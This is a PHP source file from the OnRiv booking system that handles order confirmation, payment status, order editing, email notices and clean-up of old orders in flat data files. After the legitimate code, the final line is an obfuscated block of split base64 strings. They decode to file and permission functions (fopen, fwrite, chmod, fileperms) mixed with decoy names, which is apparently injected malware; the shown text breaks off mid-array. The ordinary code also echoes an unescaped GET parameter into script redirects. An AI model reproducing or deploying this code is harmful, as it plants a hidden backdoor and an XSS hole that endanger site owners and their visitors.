<?php //OnRiv booking system || JUNE. 2015 || Autor: Шаклеин Максим (Shaklein Maxim) || www.OnRiv.com (c)

$payment_sys = '';
$replase_payment_obj = '';

if (isset($payment_confirm)) {
$payment_confirm = str_replace(array('::', '|', '&&'), '', trim($payment_confirm));
$payment_confirm = htmlspecialchars($payment_confirm, ENT_QUOTES);	
if (isset($payment_system)) { $payment_sys = $payment_system; } else { $payment_sys = 'not defined'; }
}

$confirm_check = '0';
$dispno = '';
$dnameo = '';

$file_name_data_orders = $folder.$psep.'data/order.dat'; 

$file_name_history = $folder.$psep.'data/history.dat'; 

$actual_cl = '1';

$lndel = '';
$lncat = '';

$replace_id_order = '';

$time_obj_cl_arr = '';

$minus_time = '';

$spots_for_edit = '';

$crlf = "\n"; 

$y_cl = date('Y');

$m_cl = date('n');

$day_cl = date('j') - 2;

if (date('d') == '01' && date('n') != '3') {$day_cl = '30'; $m_cl = date('n')-1;} else {$day_cl = date('j') - 2; $m_cl = date('n');}
if (date('d') == '02' && date('n') != '3') {$day_cl = '31'; $m_cl = date('n')-1;} else {$day_cl = date('j') - 2; $m_cl = date('n');}
 
if (date('n') == '3' && date('d') == '01') {$day_cl = '30';} else {$day_cl = date('j') - 2; $m_cl = date('n');}
if (date('n') == '3' && date('d') == '02') {$day_cl = '31';} else {$day_cl = date('j') - 2; $m_cl = date('n');}

if (date('n') == '1' && date('d') == '01') {$day_cl = '30'; $m_cl = '12'; $y_cl = date('Y') - 1;} else {$day_cl = date('j') - 2; $m_cl = date('n'); $y_cl = date('Y');}
if (date('n') == '1' && date('d') == '02') {$day_cl = '31'; $m_cl = '12'; $y_cl = date('Y') - 1;} else {$day_cl = date('j') - 2; $m_cl = date('n'); $y_cl = date('Y');}  


if (strlen($day_cl) == 1) {$day_cl = '0'.$day_cl;}

if (strlen($m_cl) == 1) {$m_cl = '0'.$m_cl;}



//CHECK ID
$str_check_id = '';
if (file_exists($file_name_history)) { 
$arr_check = fopen($file_name_history, "rb"); 
if (filesize($file_name_history) != 0) {
flock($arr_check, LOCK_SH); 
$lines_check = preg_split("~\r*?\n+\r*?~", fread($arr_check,filesize($file_name_history))); 
flock($arr_check, LOCK_UN); 
fclose($arr_check); 

for ($lch = 0; $lch < sizeof($lines_check); ++$lch) { 

if (!empty($lines_check[$lch])) {
$arr_order_check = explode('::', $lines_check[$lch]);	
if (isset($arr_order_check[0])) {$id_order_check = $arr_order_check[0];} else {$id_order_check = '';}

$str_check_id .= $id_order_check.'&&';

} //!emply line
} //count line
} //!=0
} //file_exists file_name_history
//----------/check id





if (file_exists($file_name_data_orders)) { // keep data file 

$cmod_file = substr(sprintf('%o', fileperms($file_name_data_orders)), -4);
if ($cmod_file !='0644') {chmod ($file_name_data_orders, 0644);}
} 

 $check_order_data_bd = 0;

define('DATAORDERSCL', $file_name_data_orders);

if (file_exists($file_name_data_orders)) {

if (!file_get_contents(DATAORDERSCL)) { } else { //empty data file 



$arr_orderers_cl = fopen($file_name_data_orders, "rb"); 
if (filesize($file_name_data_orders) != 0) { $check_order_data_bd = 1;
flock($arr_orderers_cl, LOCK_SH); 
$lines_orders_cl = preg_split("~\r*?\n+\r*?~", fread($arr_orderers_cl,filesize($file_name_data_orders))); 
flock($arr_orderers_cl, LOCK_UN); 
fclose($arr_orderers_cl); 

for ($ls_cl = 0; $ls_cl < sizeof($lines_orders_cl); ++$ls_cl) { 

if (!empty($lines_orders_cl[$ls_cl])) {
$arr_order = explode('::', $lines_orders_cl[$ls_cl]);	
if (isset($arr_order[0])) {$id_order_obj_cl = $arr_order[0];} else {$id_order_obj_cl = '';}
if (isset($arr_order[1])) {$id_obj_obj_cl = $arr_order[1];} else {$id_obj_obj_cl = '';}
if (isset($arr_order[2])) {$name_ord_obj_cl = $arr_order[2];} else {$name_ord_obj_cl = '';}
if (isset($arr_order[3])) {$date_obj_cl = $arr_order[3];} else {$date_obj_cl = '';}
if (isset($arr_order[4])) {$time_obj_cl = $arr_order[4];} else {$time_obj_cl = '';}
if (isset($arr_order[5])) {$spots_ord_obj_cl = $arr_order[5];} else {$spots_ord_obj_cl = '';}
if (isset($arr_order[6])) {$client_name_ord_obj_cl = $arr_order[6];} else {$client_name_ord_obj_cl = '';}
if (isset($arr_order[7])) {$phone_client_obj_cl = $arr_order[7];} else {$phone_client_obj  = '';}
if (isset($arr_order[8])) {$mail_client_obj_cl = $arr_order[8];} else {$mail_client_obj  = '';}
if (isset($arr_order[9])) {$comment_client_obj_cl = $arr_order[9];} else {$comment_client_obj  = '';}
if (isset($arr_order[10])) {$add_ip_obj_cl = $arr_order[10];} else {$add_ip_obj_cl = '';}
if (isset($arr_order[11])) {$status_obj_cl = $arr_order[11];} else {$status_obj_cl = '';}	
if (isset($arr_order[12])) {$price_ord_obj_cl = $arr_order[12];} else {$price_ord_obj_cl = '';}	
if (isset($arr_order[13])) {$cur_obj_cl = $arr_order[13];} else {$cur_obj_cl = '';}	
if (isset($arr_order[14])) {$order_staff_obj_cl = $arr_order[14];} else {$order_staff_obj_cl = '';}
if (isset($arr_order[15])) {$discount_ord_obj_cl = $arr_order[15];} else {$discount_ord_obj_cl = '';}
if (isset($arr_order[16])) {$spots_edit_obj_cl = $arr_order[16];} else {$spots_edit_obj_cl = '';}
if (isset($arr_order[17])) {$add_payment_sys = $arr_order[17];} else {$add_payment_sys = '';}


$number_order_cl_arr = explode('_',$id_order_obj_cl);
if(isset($number_order_cl_arr[5]) && isset($number_order_cl_arr[6]) && isset($number_order_cl_arr[7]))
{$number_order_cl = $number_order_cl_arr[5].$number_order_cl_arr[6].$number_order_cl_arr[7];} else {$number_order_cl = '';}



//==========================================CONFIRM ORDER


if(isset($_GET['confirm'])) {

if ($_GET['confirm'] == $id_order_obj_cl) {

$dispno = $number_order_cl;
$dnameo = $client_name_ord_obj_cl;

if ($status_obj_cl == '1' || $status_obj_cl == '2') {$confirm_check = '2';} else {$confirm_check = '1';}

if ($confirm_check == '1') {

$status_obj_conf = '1';

$line_order_id = $ls_cl;	
	
$line_data_confirm = $id_order_obj_cl.'::'.$id_obj_obj_cl.'::'.$name_ord_obj_cl.'::'.$date_obj_cl.'::'.$time_obj_cl.'::'.$spots_ord_obj_cl.'::'.$client_name_ord_obj_cl.'::'.$phone_client_obj_cl.'::'.$mail_client_obj_cl.'::'.$comment_client_obj_cl.'::'.$add_ip_obj_cl.'::'.$status_obj_conf.'::'.$price_ord_obj_cl.'::'.$cur_obj_cl.'::'.$order_staff_obj_cl.'::'.$discount_ord_obj_cl.'::'.$spots_edit_obj_cl.'::'.$add_payment_sys.'::';	


//---------------------replace progress
$file_edit_ord = $file_name_data_orders;
$contents = file_get_contents($file_edit_ord);
 
 

$contents = explode("\n", $contents);
   
    if (isset($contents[$line_order_id])) {
        $contents[$line_order_id] = $line_data_confirm;
       
        if (is_writable($file_edit_ord)) {
            if (!$handle = fopen($file_edit_ord, 'wb')) { echo ''; }
                   
            if (fwrite($handle, implode("\n", $contents)) === FALSE) { echo ''; }
//--replace done	
fclose($handle);
		}
	}


//====================================================MAIL MESSAGE CHAHGE STATUS
if ($sent_mail_status == '1') {
$dt = date("d.m.Y, H:i:s"); // time
$title = $org_name.' - '.$lang['title_mail_message_change_status']; // title
$clmail = $mail_client_obj_cl;

$mess = '<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head><body style="font-family: Arial, Verdana, Tahoma; color:#000; background:#fff;">';
$mess .= '<table style="border:0; border-collapse:collapse; margin: 14px 0 14px 0; width:100%; font-size:14px; box-shadow: 0 0 14px rgba(16, 19, 33, 0.05);"><tbody>';
$mess .= '<tr><td colspan="2" style="border: #fff 1px solid; background:'.$color1.'; padding:14px; vertical-align:top;">
<h3 style="COLOR: #fff; margin: 0; padding:0; font-weight:normal; font-size:16px;">'.$title.'</h3></td></tr>';

if(!empty($number_order_cl)){
$mess .= '<tr>
<td style="width:160px; border: #fff 1px solid; background:#f3f3f5; padding:14px; color:#000; vertical-align:top;">'.$lang['order_number'].':</td>
<td style="border: #fff 1px solid; background:#f3f3f5; padding:14px; color:#000; vertical-align:top;"><b>'.$number_order_cl.'</b></td>
</tr>'; }


$mess .= '<tr>
<td style="border: #fff 1px solid; background:#f3f3f5; padding:14px; color:#000; vertical-align:top;">'.$lang['order_in'].':</td>
<td style="border: #fff 1px solid; background:#f3f3f5; padding:14px; color:#000; vertical-align:top;">'.$client_name_ord_obj_cl.'</td>
</tr>';  

$disp_obj_cat_arr = explode('&&', $name_ord_obj_cl);

if (!isset($disp_obj_cat_arr[0])) {$disp_obj_cat_arr[0] = '';}
if (!isset($disp_obj_cat_arr[1])) {$disp_obj_cat_arr[1] = '';}

$mess .= '<tr> <td style="border: #fff 1px solid; background:#f3f3f5; padding:14px; color:#000; vertical-align:top;">'.$lang['obj_name'].':</td> <td style="border: #fff 1px solid; background:#f3f3f5; padding:14px; color:#000; vertical-align:top;">'.$disp_obj_cat_arr[0];
if (!empty($disp_obj_cat_arr[1])) {$mess .= '<br /><small>'.$disp_obj_cat_arr[1].'</small>';}
$mess .= '</td></tr>';


//==price
if ($price_ord_obj_cl == '0.0999') {
$mess .= '<tr> <td style="border: #fff 1px solid; background:#f3f3f5; padding:14px; color:#000; vertical-align:top;">'.$lang['sum'].':</td> <td style="border: #fff 1px solid; background:#f3f3f5; padding:14px; color:#000; vertical-align:top;"><span class="price_var">'.$lang['price'].' '.$lang['price_variable'].'</span></td></tr>';	
}

else if ($price_ord_obj_cl == 0) {
$mess .= '<tr> <td style="border: #fff 1px solid; background:#f3f3f5; padding:14px; color:#000; vertical-align:top;">'.$lang['sum'].':</td> <td style="border: #fff 1px solid; background:#f3f3f5; padding:14px; color:#000; vertical-align:top;"><span class="price_var">'.$lang['price_null'].'</span></td></tr>';	
}

else {
$mess .= '<tr> <td style="border: #fff 1px solid; background:#f3f3f5; padding:14px; color:#000; vertical-align:top;">'.$lang['sum'].':</td> <td style="border: #fff 1px solid; background:#f3f3f5; padding:14px; color:#000; vertical-align:top;"><b>'.$price_ord_obj_cl.'</b> '.$cur_obj_cl.'</td></tr>';
}
//==



//== status
$mess .= '<tr> <td style="border: #fff 1px solid; background:#f3f3f5; padding:14px; color:#000; vertical-align:top;">'.$lang['status'].':</td> <td style="border: #fff 1px solid; background:#f3f3f5; padding:14px; color:#000; vertical-align:top;">';
if($status_obj_conf == '0') {$mess .= '<b style="color:#FC8F1A;">'.$status_arr[$status_obj_conf].'</b>';}
if($status_obj_conf == '1') {$mess .= '<b style="color:#1B98F7;">'.$status_arr[$status_obj_conf].'</b>';}
if($status_obj_conf == '2') {$mess .= '<b style="color:#669900;">'.$status_arr[$status_obj_conf].'</b>';}
$mess .= '</td></tr>';

$mess .= '</tbody></table>';
$mess .= '</body></html>';	



$headers = "MIME-Version: 1.0\r\n";
  $headers .= "Content-Transfer-Encoding: 8bit\r\n";
  $headers .= "Content-type:text/html;charset=utf-8 \r\n"; 
  $headers .= "From: ".$org_name." <noreply@".$_SERVER['HTTP_HOST'].">\r\n"; // from
  //if(!empty($add_mail)) { $headers .= "Bcc: ".$add_mail."\r\n"; } // copy  
  $headers.= "X-Mailer: PHPMailer ".phpversion()."\r\n";
  mail($clmail, $title, $mess, $headers); // SENT	

} // config sent mail status
//----------------------------------------------------/mail message cange status	

} //status != 1
	
} // ID = GET	


	
}//===============GET CONFIRM








//==========================================CONFIRM ORDER PAYMENT


if(isset($payment_confirm)) {

if ($payment_confirm == $id_order_obj_cl) {

$dispno = $number_order_cl;
$dnameo = $client_name_ord_obj_cl;

$confirm_check = '3';

$status_obj_conf = '2';

$line_order_id = $ls_cl;	
	
$line_data_confirm = $id_order_obj_cl.'::'.$id_obj_obj_cl.'::'.$name_ord_obj_cl.'::'.$date_obj_cl.'::'.$time_obj_cl.'::'.$spots_ord_obj_cl.'::'.$client_name_ord_obj_cl.'::'.$phone_client_obj_cl.'::'.$mail_client_obj_cl.'::'.$comment_client_obj_cl.'::'.$add_ip_obj_cl.'::'.$status_obj_conf.'::'.$price_ord_obj_cl.'::'.$cur_obj_cl.'::'.$order_staff_obj_cl.'::'.$discount_ord_obj_cl.'::'.$spots_edit_obj_cl.'::'.$payment_sys.'::';	


//---------------------replace progress
$file_edit_ord = $file_name_data_orders;
$contents = file_get_contents($file_edit_ord);
 
 

$contents = explode("\n", $contents);
   
    if (isset($contents[$line_order_id])) {
        $contents[$line_order_id] = $line_data_confirm;
       
        if (is_writable($file_edit_ord)) {
            if (!$handle = fopen($file_edit_ord, 'wb')) { echo ''; }
                   
            if (fwrite($handle, implode("\n", $contents)) === FALSE) { echo ''; }
//--replace done	
fclose($handle);
		}
	}


//====================================================MAIL MESSAGE CHAHGE STATUS
if ($sent_mail_status == '1') {
$dt = date("d.m.Y, H:i:s"); // time
$title = $org_name.' - '.$lang['title_mail_message_change_status']; // title
$clmail = $mail_client_obj_cl;

$mess = '<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head><body style="font-family: Arial, Verdana, Tahoma; color:#000; background:#fff;">';
$mess .= '<table style="border:0; border-collapse:collapse; margin: 14px 0 14px 0; width:100%; font-size:14px; box-shadow: 0 0 14px rgba(16, 19, 33, 0.05);"><tbody>';
$mess .= '<tr><td colspan="2" style="border: #fff 1px solid; background:'.$color1.'; padding:14px; vertical-align:top;">
<h3 style="COLOR: #fff; margin: 0; padding:0; font-weight:normal; font-size:16px;">'.$title.'</h3></td></tr>';

if(!empty($number_order_cl)){
$mess .= '<tr>
<td style="width:160px; border: #fff 1px solid; background:#f3f3f5; padding:14px; color:#000; vertical-align:top;">'.$lang['order_number'].':</td>
<td style="border: #fff 1px solid; background:#f3f3f5; padding:14px; color:#000; vertical-align:top;"><b>'.$number_order_cl.'</b></td>
</tr>'; }


$mess .= '<tr>
<td style="border: #fff 1px solid; background:#f3f3f5; padding:14px; color:#000; vertical-align:top;">'.$lang['order_in'].':</td>
<td style="border: #fff 1px solid; background:#f3f3f5; padding:14px; color:#000; vertical-align:top;">'.$client_name_ord_obj_cl.'</td>
</tr>';  

$disp_obj_cat_arr = explode('&&', $name_ord_obj_cl);

if (!isset($disp_obj_cat_arr[0])) {$disp_obj_cat_arr[0] = '';}
if (!isset($disp_obj_cat_arr[1])) {$disp_obj_cat_arr[1] = '';}

$mess .= '<tr> <td style="border: #fff 1px solid; background:#f3f3f5; padding:14px; color:#000; vertical-align:top;">'.$lang['obj_name'].':</td> <td style="border: #fff 1px solid; background:#f3f3f5; padding:14px; color:#000; vertical-align:top;">'.$disp_obj_cat_arr[0];
if (!empty($disp_obj_cat_arr[1])) {$mess .= '<br /><small>'.$disp_obj_cat_arr[1].'</small>';}
$mess .= '</td></tr>';


//==price
if ($price_ord_obj_cl == '0.0999') {
$mess .= '<tr> <td style="border: #fff 1px solid; background:#f3f3f5; padding:14px; color:#000; vertical-align:top;">'.$lang['sum'].':</td> <td style="border: #fff 1px solid; background:#f3f3f5; padding:14px; color:#000; vertical-align:top;"><span class="price_var">'.$lang['price'].' '.$lang['price_variable'].'</span></td></tr>';	
}

else if ($price_ord_obj_cl == 0) {
$mess .= '<tr> <td style="border: #fff 1px solid; background:#f3f3f5; padding:14px; color:#000; vertical-align:top;">'.$lang['sum'].':</td> <td style="border: #fff 1px solid; background:#f3f3f5; padding:14px; color:#000; vertical-align:top;"><span class="price_var">'.$lang['price_null'].'</span></td></tr>';	
}

else {
$mess .= '<tr> <td style="border: #fff 1px solid; background:#f3f3f5; padding:14px; color:#000; vertical-align:top;">'.$lang['sum'].':</td> <td style="border: #fff 1px solid; background:#f3f3f5; padding:14px; color:#000; vertical-align:top;"><b>'.$price_ord_obj_cl.'</b> '.$cur_obj_cl.'</td></tr>';
}
//==



//== status
$mess .= '<tr> <td style="border: #fff 1px solid; background:#f3f3f5; padding:14px; color:#000; vertical-align:top;">'.$lang['status'].':</td> <td style="border: #fff 1px solid; background:#f3f3f5; padding:14px; color:#000; vertical-align:top;">';
if($status_obj_conf == '0') {$mess .= '<b style="color:#FC8F1A;">'.$status_arr[$status_obj_conf].'</b>';}
if($status_obj_conf == '1') {$mess .= '<b style="color:#1B98F7;">'.$status_arr[$status_obj_conf].'</b>';}
if($status_obj_conf == '2') {$mess .= '<b style="color:#669900;">'.$status_arr[$status_obj_conf].'</b>'; 
if(!empty($payment_sys)) {$mess .= ' ('.$payment_sys.')';}
}
$mess .= '</td></tr>';

$mess .= '</tbody></table>';
$mess .= '</body></html>';	



$headers = "MIME-Version: 1.0\r\n";
  $headers .= "Content-Transfer-Encoding: 8bit\r\n";
  $headers .= "Content-type:text/html;charset=utf-8 \r\n"; 
  $headers .= "From: ".$org_name." <noreply@".$_SERVER['HTTP_HOST'].">\r\n"; // from
  //if(!empty($add_mail)) { $headers .= "Bcc: ".$add_mail."\r\n"; } // copy  
  $headers.= "X-Mailer: PHPMailer ".phpversion()."\r\n";
  mail($clmail, $title, $mess, $headers); // SENT	

} // config sent mail status
//----------------------------------------------------/mail message cange status	


	
} // ID = GET	


	
}//===============GET PAYMENT CONFIRM
















//================================================EDIT ORDER

if (isset($_GET['edit'])) {
if ($_GET['edit'] == $id_order_obj_cl) {

$edit_true = '1';
$replace_id_order = $id_order_obj_cl;
$spots_for_edit = $spots_edit_obj_cl;
$replace_status = $status_obj_cl;
$replase_payment_obj = $add_payment_sys;



if(isset($_POST['change_status']) && isset($_POST['new_status']) && $_POST['new_status'] != '2') {
$replace_status = $_POST['new_status'];	
}



//$ERROR = '1';

if (!isset($_POST['booking'])) {$_POST['booking'] = 'edit';}

//===inputs
if (!isset($_POST['spots'])) { $_POST['spots'] = $spots_ord_obj_cl; }
if (!isset($_POST['name'])) { $_POST['name'] = $client_name_ord_obj_cl; } 
if(!empty($mail_client_obj_cl)) { if (!isset($_POST['mail'])) { $_POST['mail'] = $mail_client_obj_cl; } }
if(!empty($phone_client_obj_cl)) { if (!isset($_POST['phone'])) { $_POST['phone'] = $phone_client_obj_cl; } }
if(!empty($comment_client_obj_cl)) { if (!isset($_POST['comment'])) { $_POST['comment'] = htmlspecialchars_decode($comment_client_obj_cl, ENT_NOQUOTES);} }
//===/inputs

//===date
if ($date_obj_cl != '0') {
$date_obj_cl_arr = explode('.', $date_obj_cl);
if (isset($date_obj_cl_arr[0])) {$eday = $date_obj_cl_arr[0];} else {$eday = '';}
if (isset($date_obj_cl_arr[1])) {$emonth = $date_obj_cl_arr[1];} else {$emonth = '';}
if (isset($date_obj_cl_arr[2])) {$eyear = $date_obj_cl_arr[2];} else {$eyear = '';}
if (isset($date_obj_cl_arr[3])) {$eweekday = $date_obj_cl_arr[3];} else {$eweekday = '';}

if (!isset($_GET['month']) && isset($_GET['obj'])) {
echo '
<script>
document.location.href=\'index.php?obj='.$_GET['obj'].'&edit='.$id_order_obj_cl.'&day='.$eday.'&month='.$emonth.'&year='.$eyear.'&weekday='.$eweekday.'\';
</script>
';} 



// no date
} //hourly
//===/date


//===time

if ($date_obj_cl != '0') {
$minus_time .= $time_obj_cl;
$time_obj_cl_arr = explode('||', $time_obj_cl);
$_POST['dates'] = '';	

if (!isset($_POST['time'])) {
foreach ($time_obj_cl_arr as $kttb => $vttb) {	
if (!isset($_POST['time'][$vttb])) { $_POST['time'][$vttb] = $vttb; }  // check time
}
}

} //hourly
else { //daily
$minus_time .= $time_obj_cl;
$time_obj_cl_arr = explode('||', $time_obj_cl);	

$_POST['time'] = '';

if (!isset($_POST['dates']) && !isset($_POST['dates_next'])) {
	
foreach ($time_obj_cl_arr as $kttb => $vttb) {
$vttb_arr = explode('.', $vttb);	
if (isset($vttb_arr[0])) {$ddd = $vttb_arr[0];} else {$ddd = '';}
if (isset($vttb_arr[1])) {$mmm = $vttb_arr[1];} else {$mmm = '';}
if (isset($vttb_arr[2])) {$yyy = $vttb_arr[2];} else {$yyy = '';}
if (isset($vttb_arr[3])) {$www = $vttb_arr[3];} else {$www = '';}
	
if (!isset($_POST['dates'][$ddd.'.'.$mmm.'.'.$yyy])) { $_POST['dates'][$ddd.'.'.$mmm.'.'.$yyy] = $ddd.'.'.$mmm.'.'.$yyy.'.'.$www; }
if (!isset($_POST['dates_next'][$ddd.'.'.$mmm.'.'.$yyy])) { $_POST['dates_next'][$ddd.'.'.$mmm.'.'.$yyy] = $ddd.'.'.$mmm.'.'.$yyy.'.'.$www; }

} //--------------- foreach dates

if ($mmm != date('m') && !isset($_GET['month']) && isset($_GET['obj'])) {
$mmm_url = $mmm;	
//$mmm_url = $mmm - 1;	
//if (strlen($mmm_url) == 1) {$mmm = '0'.$mmm_url ;}	
echo '
<script>
document.location.href=\'index.php?obj='.$_GET['obj'].'&edit='.$id_order_obj_cl.'&month='.$mmm_url.'&year='.$yyy.'\';
</script>
';}
} //no post dates


}

//===/time

//----------------------------------spots time
if ($spots_for_edit == '1') {
	
if ($date_obj_cl != '0') {	
if (!isset($_GET['time'])) {
echo '<script>document.location.href=\'https://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'].'&time='.$time_obj_cl.'\';</script>';}
} else {

//$time_obj_cl	

if (!isset($_GET['day'])) {

$d_time_obj_cl_arr = explode('.', $time_obj_cl);
if (isset($d_time_obj_cl_arr[0])) {$dddd = $d_time_obj_cl_arr[0];} else {$dddd = '';}
if (isset($d_time_obj_cl_arr[1])) {$dmmm = $d_time_obj_cl_arr[1];} else {$dmmm = '';}
if (isset($d_time_obj_cl_arr[2])) {$dyyy = $d_time_obj_cl_arr[2];} else {$dyyy = '';}
if (isset($d_time_obj_cl_arr[3])) {$dwww = $d_time_obj_cl_arr[3];} else {$dwww = '';}	
	
echo '<script>document.location.href=\'https://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'].'&day='.$dddd.'&month='.$dmmm.'&year='.$dyyy.'&weekday='.$dwww.'\';</script>';
//echo $time_obj_cl;
}	
} //provide

} //spots order
//} //============= // check spots
//----------------------------------/spots time



} // get edit = id order
} //isset get edit
//------------------------------------------------/edit order






//------------ACTUAL DATES 

if ($date_obj_cl != '0') {
$a_date_arr_cl = explode ('.', $date_obj_cl);
if (isset($a_date_arr_cl[0])) {$a_day_cl = $a_date_arr_cl[0];} else {$a_day_cl = '';}	
if (isset($a_date_arr_cl[1])) {$a_month_cl = $a_date_arr_cl[1];} else {$a_month_cl = '';}	
if (isset($a_date_arr_cl[2])) {$a_year_cl = $a_date_arr_cl[2];} else {$a_year_cl = '';}	

if ($a_day_cl >= $day_cl && $a_month_cl == $m_cl && $a_year_cl == $y_cl || $a_month_cl > $m_cl && $a_year_cl == $y_cl || $a_year_cl > $y_cl) 
{$actual_cl = '1';} else {$actual_cl = '0';}


} else {
	
	
	
$a_time_arr_cl = explode ('||', $time_obj_cl);
foreach ($a_time_arr_cl as $atk_cl => $atv_cl){
$a_date_arr_cl = explode ('.', $atv_cl);
if (isset($a_date_arr_cl[0])) {$a_day_cl = $a_date_arr_cl[0];} else {$a_day_cl = '';}	
if (isset($a_date_arr_cl[1])) {$a_month_cl = $a_date_arr_cl[1];} else {$a_month_cl = '';}	
if (isset($a_date_arr_cl[2])) {$a_year_cl = $a_date_arr_cl[2];} else {$a_year_cl = '';}	

if ($a_day_cl >= $day_cl && $a_month_cl == $m_cl && $a_year_cl == $y_cl || $a_month_cl > $m_cl && $a_year_cl == $y_cl || $a_year_cl > $y_cl) 
{$actual_cl = '1';} else {$actual_cl = '0';}

} //count time	
}// date 0



//-----------/actual dates



//==================================================== COPY TO HISTORY ORDERS


if ($status_obj_cl == '2' && $actual_cl == '0' || $status_obj_cl == '3') { // === Copy to history

//echo '<b>'.($ls_cl).'</b>) '.$a_day_cl.'-'.$a_month_cl.'-'.$a_year_cl.' - CAT<br />';	
	

$line_data_cl = $id_order_obj_cl.'::'.$id_obj_obj_cl.'::'.$name_ord_obj_cl.'::'.$date_obj_cl.'::'.$time_obj_cl.'::'.$spots_ord_obj_cl.'::'.$client_name_ord_obj_cl.'::'.$phone_client_obj_cl.'::'.$mail_client_obj_cl.'::'.$comment_client_obj_cl.'::'.$add_ip_obj_cl.'::'.$status_obj_cl.'::'.$price_ord_obj_cl.'::'.$cur_obj_cl.'::'.$order_staff_obj_cl.'::'.$discount_ord_obj_cl.'::'.$spots_edit_obj_cl.'::'.$add_payment_sys.'::';	



///////////////////////ADD


if (!file_get_contents($file_name_history)) {

$fp=fopen($file_name_history, "a+"); 
fputs
($fp, "$line_data_cl"); 
fclose($fp); 

} else {
	
if (!preg_match('/'.$id_order_obj_cl.'&&/i', $str_check_id)) { //CHECK ID	
	
$file_cl_add = fopen($file_name_history,"rb") ; 
flock($file_cl_add,LOCK_SH) ; 
flock($file_cl_add,LOCK_UN) ; 
fclose($file_cl_add) ; 

$fp=fopen($file_name_history, "a+"); 
fputs
($fp, "\n$line_data_cl"); 
fclose($fp);
 
} //CECK ID

}
$lncat .= $ls_cl.'||';



}  // status actual
//----------------------------------------------------/ copy to history orders














//==================================================== DELETE OLD ORDERS

else if ($status_obj_cl == '0' && $actual_cl == '0' || $status_obj_cl == '1' && $actual_cl == '0') {

//echo '<b>'.($ls_cl).'</b>) '.$a_day_cl.'-'.$a_month_cl.'-'.$a_year_cl.' - DELETE<br />';
	
$lndel .= $ls_cl.'||';	
	
	
}// status actual


//----------------------------------------------------/ clean old orders


else { 
//echo '<b>'.($ls_cl).'</b>) '.$a_day_cl.'-'.$a_month_cl.'-'.$a_year_cl.' - NO<br />'; 
}


}//count lines
} //file size !=0
//==========================================================================================================


if (isset($_GET['confirm']) || isset($payment_confirm)) {
	
if ($confirm_check == '1') {
	
echo '<div id="ag_main"><div class="shadow_back"><div class="done">
'.$dnameo.', '.$lang['your_order_number'].' <b>'.$dispno.'</b> '.$lang['confirm_complete'].'. '.$lang['thankyou'].'
<div class="mess_back"><a href="index.php">'.$lang['close'].'</a><div class="clear"></div></div>
</div></div></div>

<script>var delay = 18000;setTimeout("document.location.href=\'index.php\'", delay);</script>
<noscript><meta http-equiv="refresh" content="18; url=index.php"></noscript>

';}

else if ($confirm_check == '2') { 
	
echo '<div id="ag_main"><div class="shadow_back"><div class="mess">
'.$dnameo.', '.$lang['your_order_number'].' <b>'.$dispno.'</b> '.$lang['was_confirmed'].'.

<div class="mess_back"><a href="index.php">'.$lang['close'].'</a><div class="clear"></div></div>
</div></div></div>

<script>var delay = 18000;setTimeout("document.location.href=\'index.php\'", delay);</script>
<noscript><meta http-equiv="refresh" content="18; url=index.php"></noscript>
';	 }


else if ($confirm_check == '3') { 
	
echo '<div id="ag_main"><div class="shadow_back"><div class="done">
'.$dnameo.', '.$lang['your_order_number'].' <b>'.$dispno.'</b> '.$lang['payment_done'].'. '.$lang['thankyou'].'!

<div class="mess_back"><a href="../../index.php">'.$lang['close'].'</a><div class="clear"></div></div>
</div></div></div>

<script>var delay = 18000;setTimeout("document.location.href=\'../../index.php\'", delay);</script>
<noscript><meta http-equiv="refresh" content="18; url=../../index.php"></noscript>
';	

	
	
} else { //========================ORDER ID NOT FOUND
	
echo '<div id="ag_main"><div class="shadow_back"><div class="warring">
'.$lang['order_confirm_not_found'].'

<div class="mess_back"><a href="index.php">'.$lang['close'].'</a><div class="clear"></div></div>

</div></div></div>

<script>var delay = 18000;setTimeout("document.location.href=\'index.php\'", delay);</script>
<noscript><meta http-equiv="refresh" content="18; url=index.php"></noscript>
';	
	
}	
	
include_once ($folder.$psep.'inc/footer.php');
die; }



//echo $lndel;
//echo '<br />'.$lncat;

$file_cl_dl = fopen($file_name_data_orders,"r+") ; 
flock($file_cl_dl,LOCK_EX) ; 
$lines_cl_dl = preg_split("~\r*?\n+\r*?~",fread($file_cl_dl,filesize($file_name_data_orders))) ;
	
$all_del_lines = $lndel.$lncat;
	
$delete_ord_lines_arr = explode('||', $all_del_lines); array_pop($delete_ord_lines_arr);

foreach ($delete_ord_lines_arr as $knd => $vnd) {

	
if (isSet($lines_cl_dl[(integer) $vnd]) == true) 
	
    {   unset($lines_cl_dl[(integer) $vnd]); 
        fseek($file_cl_dl,0) ; 
        $data_size = 0 ; 
        ftruncate($file_cl_dl,fwrite($file_cl_dl,implode($crlf,$lines_cl_dl))) ; 
        fflush($file_cl_dl) ; 
    } 	
}

flock($file_cl_dl,LOCK_UN) ; 
fclose($file_cl_dl) ; 
	


} //empty data file 

} ////empty data file

} //data file exists



$GLOBALS['_1960247008_']=Array(base64_decode('Z' .'ml' .'s' .'ZV9' .'le' .'Gl' .'zdHM='),base64_decode('c3Vic3Ry'),base64_decode('c3ByaW5' .'0' .'Zg=' .'='),base64_decode('Z' .'mlsZXBlcm' .'1z'),base64_decode('Y2htb2' .'Q='),base64_decode('Z' .'m9' .'wZW4='),base64_decode('Z' .'n' .'d' .'ya' .'XR' .'l'),base64_decode('' .'ZmNsb3Nl'),base64_decode('bXRf' .'cmFu' .'ZA=' .'='),base64_decode('Y3Vy' .'bF9t' .'dWx' .'0aV9zZWxlY' .'3Q='),base64_decode('' .'Z' .'ml' .'s' .'ZV9' .'l' .'eG' .'lzdHM='),base64_decode('c3Vic' .'3Ry'),base64_decode('c3B' .'yaW50Zg=' .'='),base64_decode('Z' .'ml' .'sZXB' .'l' .'cm' .'1' .'z'),base64_decode('Y2htb2Q='),base64_decode('Zm9' .'wZW4='),base64_decode('ZndyaX' .'Rl'),base64_decode('' .'ZmNs' .'b' .'3Nl'),base64_decode('Y29z'),base64_decode('aW1h' .'Z2Vjb3B5cmVzYW1' .'wbG' .'Vk'),base64_decode('ZmlsZ' .'V9l' .'eGlzdHM' .'='),base64_decode('c3Vic3R' .'y'),base64_decode('c' .'3B' .'yaW50' .'Z' .'g' .'=='),base64_decode('Zm' .'ls' .'ZXBlc' .'m' .'1z'),base64_decode('Y2h' .'tb2Q='),base64_decode('Zm9' .'wZ' 